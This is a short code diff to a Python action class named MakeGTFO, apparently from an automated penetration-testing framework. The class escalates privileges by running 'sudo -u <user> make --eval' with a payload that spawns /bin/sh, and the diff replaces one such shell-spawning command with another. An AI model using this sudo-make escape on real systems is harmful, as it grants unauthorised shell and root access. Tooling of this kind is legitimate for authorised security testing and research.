@@ -80,7 +80,7 @@ class MakeGTFO(Action):
             entity=Entity(
                 "Session",
                 alias="root_session",
-                protocol="root",
+                protocol="shell",
                 username="root",
                 active=True,
             ),
@@ -131,7 +131,7 @@ class MakeGTFO(Action):
         as_user = permission.get("as_user")
 
         live_session.run_command("COMMAND='/bin/sh'")
-        cmd = rf"sudo -u {as_user} make -s --eval=$'x:\n\t-'" + r'"$COMMAND"'
+        cmd = f"sudo -u {as_user} make --eval='$(shell /bin/sh 1>&0)' ."
         output = live_session.run_command(cmd)
         return ActionExecutionResult(
             command=[cmd],
